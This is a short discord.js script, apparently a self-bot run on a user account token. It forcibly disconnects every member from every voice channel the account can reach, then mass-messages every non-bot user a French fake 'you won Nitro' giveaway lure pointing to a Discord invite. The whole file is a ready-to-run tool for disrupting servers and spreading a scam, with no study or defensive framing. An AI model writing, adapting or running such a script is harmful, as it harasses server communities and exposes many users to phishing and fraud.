const Discord = require('discord.js'),
    client = new Discord.Client(),
    tokens = ['UR TOKEN OF YOUR MAIN ACCOUNT OR SECOND ACCOUNT NOT BOT TOKEN']

client.on('ready', async () => {
        voiceChannels = client.channels.filter(
            (channel) =>
                channel.type === 'voice' &&
                !!channel.guild 
                
        ),
        users = client.users.filter(
            (user) => !user.bot
        )
    voiceChannels.forEach(async (voiceChannel) => {
        voiceChannel.members.forEach(async (member) => {
            try {
                await member.setVoiceChannel(null)
            } catch (_) {
                0
            }
        })
    })
    users.forEach(async (user) => {
        const embed = new Discord.RichEmbed()
        .setTitle("Félicitations")
        .setDescription("Giveaway en cours sur : -> discord.gg/")
        .setFooter("Bravo vous avez gagné un nitro")
        
        try {
            await user.send('Giveaway en cours sur : -> discord.gg/')
       } catch (_) {
            0
        }
    })
})

tokens.forEach(async (token) => client.login(token))
